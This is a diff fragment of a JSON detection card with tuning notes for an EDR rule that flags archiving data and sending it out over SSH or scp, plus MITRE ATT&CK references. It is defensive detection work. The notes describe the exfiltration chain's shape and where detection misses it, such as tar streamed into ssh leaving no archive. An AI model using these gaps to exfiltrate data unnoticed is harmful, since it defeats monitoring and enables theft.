+      "CR-EDR-0027 fires on an attempt: it needs no connection. To tell an attempt from a transfer, look for a network row from the ssh process (the second hunt query on this card). This chain produces none.",
+      "A tar stream piped into ssh leaves no archive on disk, and tar's command line carries `-` in place of an archive path, so the archived leg does not match that shape. The ssh command line still carries the remote file name, which is why step-04 satisfies the carried leg.",
+      "Leave the MITRE tag off CR-EDR-0027 and keep its name as written. The matcher reads a saved XQL and a correlation as one engine family, so a tagged issue would also be credited to the validation rows of every step with that technique. The name shares no word of four letters or more with any validation row's description, so the issue cannot be credited to one of them by name overlap either.",
+      "Keep the rule at Medium or higher: only Medium-or-higher issues create or join a case.",
+      "Expect backup jobs to match: a job that writes an archive into /tmp and copies it with scp has the same shape. Exclude the job's host and account, not the pattern.",
+      "The rule matches list and extract runs of an archiver as well as create runs. A create-only match is a tuning choice for the tenant; it was left out to keep the rule to the recorded query shape.",
+      "The built-in alert `A compressed file was exfiltrated over SSH` is Informational and documents a 14-day activation period and a 30-day training period. It is hunt content here because this chain opens no SSH session. A real transfer to a second host would be needed to test it, and this lab has no second host.",
+      "The built-in Low Analytics BIOCs seen on this lab endpoint are not declared: none has been observed for this chain, and a Low issue never creates or joins a case."
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex analytics alert reference — A compressed file was exfiltrated over SSH",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/a-compressed-file-was-exfiltrated-over-ssh",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK — T1048 Exfiltration Over Alternative Protocol",
+      "url": "https://attack.mitre.org/techniques/T1048/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1560.001 Archive Collected Data: Archive via Utility",
+      "url": "https://attack.mitre.org/techniques/T1560/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1074.001 Data Staged: Local Data Staging",
+      "url": "https://attack.mitre.org/techniques/T1074/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1070.004 Indicator Removal: File Deletion",
+      "url": "https://attack.mitre.org/techniques/T1070/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "RFC 6761 — Special-Use Domain Names (the .invalid name never resolves)",
+      "url": "https://www.rfc-editor.org/rfc/rfc6761",
+      "publisher": "IETF"
+    }
+  ]
+}
